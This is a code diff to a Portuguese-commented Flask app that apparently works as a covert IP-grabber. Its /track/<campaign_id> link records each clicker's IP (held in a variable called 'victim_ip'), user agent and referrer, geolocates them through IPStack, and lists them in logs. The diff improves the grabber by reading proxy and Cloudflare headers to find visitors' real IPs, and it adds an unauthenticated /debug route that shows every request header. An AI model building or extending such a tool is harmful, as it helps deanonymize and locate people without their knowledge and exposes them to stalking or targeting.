@@ -39,14 +39,64 @@ def index():
         <li><a href="/logs">/logs</a> - Ver logs em JSON</li>
         <li><a href="/logs/csv">/logs/csv</a> - Baixar logs em CSV</li>
         <li><a href="/stats">/stats</a> - Estatísticas dos cliques</li>
+        <li><a href="/debug">/debug</a> - Debug de headers e IP</li>
     </ul>
     """
+
+@app.route('/debug')
+def debug():
+    """Rota de debug para verificar headers e IPs."""
+    real_ip = get_real_ip()
+    remote_addr = request.remote_addr
+    
+    headers_info = {}
+    for header, value in request.headers:
+        headers_info[header] = value
+    
+    return jsonify({
+        'real_ip_detected': real_ip,
+        'remote_addr': remote_addr,
+        'all_headers': headers_info,
+        'user_agent': request.headers.get('User-Agent', 'N/A'),
+        'referer': request.headers.get('Referer', 'N/A')
+    })
+
+def get_real_ip():
+    """Obtém o IP real do usuário, considerando proxies e load balancers."""
+    # Lista de headers que podem conter o IP real
+    ip_headers = [
+        'X-Forwarded-For',
+        'X-Real-IP', 
+        'X-Forwarded',
+        'Forwarded-For',
+        'Forwarded',
+        'CF-Connecting-IP',  # Cloudflare
+        'True-Client-IP',    # Cloudflare Enterprise
+        'X-Client-IP',
+        'X-Cluster-Client-IP'
+    ]
+    
+    # Verifica cada header
+    for header in ip_headers:
+        ip = request.headers.get(header)
+        if ip:
+            # X-Forwarded-For pode ter múltiplos IPs separados por vírgula
+            # O primeiro é geralmente o IP original do cliente
+            if ',' in ip:
+                ip = ip.split(',')[0].strip()
+            
+            # Verifica se é um IP válido (não localhost, não privado)
+            if ip and ip not in ['127.0.0.1', '::1', 'localhost']:
+                return ip
+    
+    # Fallback para o IP direto
+    return request.remote_addr
 
 @app.route('/track/<campaign_id>')
 def track(campaign_id):
     """Rota principal que captura os dados e redireciona."""
     # 1. Captura dados básicos da requisição
-    victim_ip = request.remote_addr
+    victim_ip = get_real_ip()
     user_agent = request.headers.get('User-Agent', 'N/A')
     referrer = request.headers.get('Referer', 'N/A')
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -78,9 +128,14 @@ def track(campaign_id):
 
 def get_geolocation(ip):
     """Consulta a API IPStack para obter dados de localização."""
-    # IPs locais não podem ser geolocalizados
-    if ip in ['127.0.0.1', 'localhost'] or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
-        print(f"IP local detectado ({ip}): geolocalização não disponível")
+    # IPs locais e privados não podem ser geolocalizados
+    if (ip in ['127.0.0.1', 'localhost', '::1'] or 
+        ip.startswith('192.168.') or 
+        ip.startswith('10.') or 
+        ip.startswith('172.') or
+        ip.startswith('169.254.') or  # Link-local
+        ip == '0.0.0.0'):
+        print(f"IP local/privado detectado ({ip}): geolocalização não disponível")
         return ('Local', 'Local', 'Rede Local', 'Rede Local', 'Rede Local')
     
     try:
